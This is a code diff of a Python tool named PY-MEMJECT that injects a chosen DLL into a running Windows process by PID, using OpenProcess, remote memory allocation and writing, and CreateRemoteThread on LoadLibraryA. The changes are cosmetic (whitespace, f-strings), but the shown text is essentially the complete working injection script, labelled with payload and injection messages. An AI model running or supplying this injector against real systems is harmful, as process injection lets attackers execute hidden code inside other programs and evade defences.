@@ -4,18 +4,18 @@ from ctypes import *
 def runtime_injection():
 
     print("\n ---{PY-MEMJECT, Runtime .DLL injection}---\n")
-    
+
     dll_name   = sys.argv[1]
     dll_length = len(dll_name)
     PID        = sys.argv[2]
     kernel32   = windll.kernel32
-    
+
     if len(sys.argv) < 2:
         print("[!] Usage: ./PY-MEMJECT calc32.dll <PID>")
         sys.exit(1)
-    
-    print("[+] Current selected .DLL payload: %s" %dll_name)
-    print("[+] Current selected process PID: %s" %PID)
+
+    print(f"[+] Current selected .DLL payload: {dll_name}")
+    print(f"[+] Current selected process PID: {PID}")
 
     # Runtime - Windows API functions process
     # OpenProcess() --> Injector attaches to host process
@@ -26,18 +26,18 @@ def runtime_injection():
     PAGE_READWRITE = 0x04
     PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
     VIRTUAL_MEM = ( 0x1000 | 0x2000 )
-    
+
     dwDesiredAccess  = PROCESS_ALL_ACCESS
     bInheritHandle   = False
     dwProcessId      = int(PID)
     # Opens the process object via OpenProcess()
     loading_process = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
     if not loading_process:
-        print("[!] Error attaching to the process: %s" %dwProcessId)
+        print(f"[!] Error attaching to the process: {dwProcessId}")
         sys.exit(1)
     else:
-        print("[+] Attached to the process: %s" %dwProcessId)
-        
+        print(f"[+] Attached to the process: {dwProcessId}")
+
     hProcess         = loading_process
     lpAddress        = 0
     dwSize           = dll_length
@@ -50,7 +50,7 @@ def runtime_injection():
         sys.exit(1)
     else:
         print("[+] Host process memory allocation sucess")
-        
+
     hProcess         = loading_process
     lpBaseAddress    = allocate_memory
     lpBuffer         = dll_name
@@ -63,10 +63,10 @@ def runtime_injection():
         sys.exit(1)
     else:
         print("[+] Successfully copied .DLL into host process")
-        
+
     h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
     h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
-    
+
     hProcess            = loading_process
     lpThreadAttributes  = None
     dwStackSize         = 0
@@ -76,7 +76,7 @@ def runtime_injection():
     lpThreadId          = byref(c_ulong(0))
     code_execution = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize,
                                                  lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
-    print("[+] Successful injection into PID: %s" %PID)
+    print(f"[+] Successful injection into PID: {PID}")
     
 if __name__ == '__main__':
     runtime_injection()
